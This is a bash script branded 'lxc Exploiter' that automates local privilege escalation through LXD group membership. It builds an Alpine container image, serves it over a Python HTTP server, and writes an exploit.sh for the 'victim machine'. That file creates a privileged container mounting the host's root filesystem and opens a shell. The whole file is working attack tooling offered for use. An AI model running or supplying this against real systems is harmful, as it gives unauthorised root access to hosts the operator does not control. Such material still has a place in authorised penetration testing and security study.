# Coloring

RED='\033[0;31m';

# Exploiting

cat << "EOF"

  e88'Y88           888                       e88`Y88 
 d888  'Y Y8b Y888P 888 88e   ,e e,  888,8,  d888  `Y  8888 8888 Y8b Y888P
C8888      Y8b Y8P  888 888b d88 88b 888 "  C8888 eeee 8888 8888  Y8b Y8P
 Y888  ,d   Y8b Y   888 888P 888   , 888     Y888 888P Y888 888P   Y8b Y
  "88,d88    888    888 88`   `YeeP` 888      `88 88`   `88 88`     888
             888                                                    888
             888                                                    888

			   { lxc Exploiter }

EOF

sleep 1

printf "{{ - - - - - - - - - - - The Script Setting Your Exploiting Env Now - - - - - - - - - - }}\n\n";

sleep 0.5;

printf "{{ - - - - - - - Updating Repos - - - - - - }}\n\n";


sudo apt update;

sleep 0.5;

printf "\n\n{{ - - - - - - - - - - Clonning The Distro Builder - - - - - - - - - }}\n\n";

go get -d -v github.com/lxc/distrobuilder;

sleep 0.3;

printf "\n\n{{ - - - - - - - -  Making The Distrobuilder Directory - - - - - - - }}\n\n";

cd $HOME/go/src/github.com/lxc/distrobuilder;
make;

sleep 0.3

printf "\n\n{{ - - - - - - Preparing The Creation Of Alpine - - - - - - - }}\n\n";

mkdir -p $HOME/ContainerImages/alpine/;
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml;

sleep 0.3

printf "\n\n{{ - - - - - - - Create The Container - - - - - - - }}\n\n";

sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml  -o image.release=3.8;

sleep 0.5

rm -rf $HOME/0-Exploit-lxc/;

mkdir $HOME/0-Exploit-lxc;

cd $HOME/ContainerImages/alpine/;

mv lxd.tar.xz $HOME/0-Exploit-lxc/;

mv rootfs.squashfs $HOME/0-Exploit-lxc/

printf "\n\n{=============================================================}\n\n";

printf "\n\n\e[7m |-> [+] All Exploitation Files Saved In 0-Exploit-lxc\n\n";

printf "\n\n |-> [+] Upload The lxd.tar.xz & rootfs.squashfs To The Vulnerble Server ..\n\n";

printf "\n\n |-> [+] A Python Serevr Will Start Now, It Contains The Files, Happy Hacking ;)\e[27m\n\n";

printf "\n\n{=============================================================}\n\n";

sleep 1;

printf "\n\n-----------------------------------------------------\n\n";
printf "\n - - - - - - - \e[5m Starting Python3 Server \e[25m- - - - - -\n";
printf "\n\n-----------------------------------------------------\n\n";

cd $HOME/0-Exploit-lxc/;

printf "\n\n---------------------------------\n\n";
printf "{{ Crafting The Exploitation Script }}\n\n";
printf "|-> [+]\e[7mAfter Uploading The Containers, Upload The\e[27m \033[31mexploit.sh\033[0m \e[7mAnd Run It In The Victim Machine\e[27m\n\n";
printf "\n\n---------------------------------\n\n";
echo "lxc image import lxd.tar.xz rootfs.squashfs --alias alpine; lxc init alpine privesc -c security.privileged=true; lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true; lxc start privesc; lxc exec privesc /bin/sh; whoami; pwd" > exploit.sh;
chmod +x exploit.sh;

printf "\n\nServer Started In :\n";
str=$(pwd);
printf '\033[31m%s\033[0m\n' "$str";
printf "\n\nContaining The Files :\n";
str=$(ls);
printf '\033[31m%s\033[0m\n' "$str";
printf "\n\n";
python3 -m http.server 8000
